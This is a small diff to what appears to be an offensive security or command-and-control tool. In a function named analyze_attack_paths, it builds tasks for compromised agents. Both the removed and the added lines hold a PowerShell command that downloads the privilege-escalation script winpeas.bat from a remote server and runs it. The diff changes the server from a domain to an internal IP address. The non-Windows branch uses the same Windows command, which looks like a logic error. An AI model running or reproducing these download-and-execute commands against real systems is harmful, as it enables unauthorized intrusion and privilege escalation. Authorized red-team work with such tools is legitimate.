@@ -1968,11 +1968,11 @@ def analyze_attack_paths():
 
             if "windows" in agent_platform:
                 script = (
-                    "Invoke-WebRequest -Uri http://iotstdpool.com:8000/scripts/winpeas.bat -OutFile winpeas.bat; cmd.exe /c winpeas.bat"
+                    "Invoke-WebRequest -Uri http://10.5.9.41:5001/scripts/winpeas.bat -OutFile winpeas.bat; cmd.exe /c winpeas.bat"
                 )
             else:
                 script = (
-                    "Invoke-WebRequest -Uri http://iotstdpool.com:8000/scripts/winpeas.bat -OutFile winpeas.bat; cmd.exe /c winpeas.bat"
+                    "Invoke-WebRequest -Uri http://10.5.9.41:5001/scripts/winpeas.bat -OutFile winpeas.bat; cmd.exe /c winpeas.bat"
                 )
 
             tasks[task_id] = {
